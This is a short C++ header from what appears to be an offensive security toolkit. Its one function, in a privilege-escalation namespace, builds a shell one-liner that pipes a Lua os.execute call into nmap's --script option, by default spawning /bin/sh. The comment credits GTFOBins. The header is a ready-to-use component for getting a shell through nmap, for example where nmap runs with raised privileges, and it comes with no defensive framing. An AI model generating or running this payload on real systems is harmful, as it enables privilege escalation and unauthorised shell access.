#pragma once

#include "murk/flows/string.hpp"

#include <fmt/format.h>
#include <iomanip>

// Pretty much stolen from gtfobins

namespace murk::priv {
  inline std::string nmap(std::string_view command = "/bin/sh", std::string_view path_and_args = "nmap") {
    return fmt::format("echo 'os.execute(\"{}\")'|{} --script=/dev/stdin", escape_c(command), path_and_args);
  }
}
